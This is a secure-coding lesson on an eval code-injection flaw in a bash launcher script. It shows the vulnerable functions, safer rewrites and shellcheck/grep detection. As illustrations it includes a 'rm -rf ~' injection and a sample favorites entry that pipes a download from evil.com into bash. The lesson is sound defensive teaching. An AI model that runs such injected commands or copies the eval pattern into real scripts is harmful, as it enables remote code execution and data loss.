# Lesson 8: `eval` on Unsanitized User Input

**File affected:** `scripts/actions/launcher.sh`
**Severity:** Critical — arbitrary command execution / code injection

---

## What Happened

The `run_command` and `show_favorites` functions execute user-supplied input directly
through `eval`:

```bash
run_command() {
  local cmd="${*:-}"
  # ...user picks cmd from fuzzel...
  if [ -n "$cmd" ]; then
    eval "$cmd" &      # BUG: eval on unsanitized input
  fi
}

show_favorites() {
  selected=$(cat "$FAVORITES_FILE" | grep -v '^#' | rofi -dmenu ...)
  if [ -n "$selected" ]; then
    eval "$selected" &  # BUG: runs whatever is in the favorites file
  fi
}
```

`eval` interprets its argument as shell code. If a fuzzel entry or favorites file
contains shell metacharacters — `; rm -rf ~`, `$(malicious-cmd)`, backticks,
redirections — they execute with the user's full permissions.

A favorites file entry like:
```
firefox; curl -s http://evil.com/payload | bash
```
would launch firefox AND run the payload silently.

## The Fix

Use `exec` with an explicit argument array, never `eval`:

```bash
run_command() {
  local cmd="${*:-}"
  if [ -n "$cmd" ]; then
    # Split safely — no shell interpretation of metacharacters
    # shellcheck disable=SC2086
    exec $cmd &   # still word-splits, but no eval-level interpretation
  fi
}
```

For fully safe execution when the command may contain spaces but not shell syntax:

```bash
# If the command is a single executable name:
"$cmd" &

# If the command may have space-separated args but no shell syntax:
read -ra cmd_parts <<< "$cmd"
"${cmd_parts[@]}" &
```

For `show_favorites`, validate that each entry is a real executable before running:

```bash
show_favorites() {
  selected=$(cat "$FAVORITES_FILE" | grep -v '^#' | rofi -dmenu ...)
  if [ -n "$selected" ]; then
    # Only run if it looks like a plain command (no metacharacters)
    if [[ "$selected" =~ ^[a-zA-Z0-9_/[:space:]-]+$ ]]; then
      read -ra cmd_parts <<< "$selected"
      "${cmd_parts[@]}" &
    else
      notify-send "Launcher" "Blocked unsafe command: $selected"
    fi
  fi
}
```

## The General Rule

> **Never pass user-controlled strings to `eval`.** User-controlled means: anything
> read from a file, received from a pipe, entered in a text field, or returned by
> an external command.

| Instead of | Use |
|---|---|
| `eval "$cmd"` | `"$cmd"` (if single word) or `"${cmd_array[@]}"` (if array) |
| `eval "$cmd &"` | `"${cmd_array[@]}" &` |
| `eval "$(some-command)"` | `output=$(some-command); do_something_safe "$output"` |

## How to Catch It

```bash
shellcheck scripts/actions/launcher.sh
# SC2091, SC2094, SC2086 — shellcheck flags most eval-adjacent patterns
grep -rn '\beval\b' scripts/ --include="*.sh"
```

Any `eval` on a variable that came from outside the script is a security review item.
